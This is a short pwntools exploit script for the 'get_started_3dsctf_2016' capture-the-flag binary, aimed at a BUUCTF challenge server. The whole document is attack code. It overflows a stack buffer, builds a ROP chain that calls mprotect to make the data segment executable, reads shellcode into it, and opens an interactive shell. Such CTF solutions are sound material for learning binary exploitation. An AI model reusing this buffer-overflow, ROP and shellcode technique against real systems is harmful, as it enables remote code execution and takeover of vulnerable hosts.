from pwn import *

io = remote('node4.buuoj.cn', 27930)
# io = process('./get_started_3dsctf_2016')
e = ELF('./get_started_3dsctf_2016')

# gdb.attach(io, gdbscript="b *0x08048A40")
context.log_level = 'debug'

mprotect = e.symbols['mprotect']
buf = 0x80ea000  # vmmap看的data段
pop_3_ret = 0x0804f460 # pop esi; pop edi; pop ebp; ret
read = e.symbols['read']

payload1 = flat('a' * 56, mprotect, pop_3_ret, buf, 0x1000, 7)
payload1 += flat(read, buf, 0, buf, 0x100)

io.sendline(payload1)

shellcode = asm(shellcraft.sh(), arch='i386', os='linux')
io.sendline(shellcode)
io.interactive()
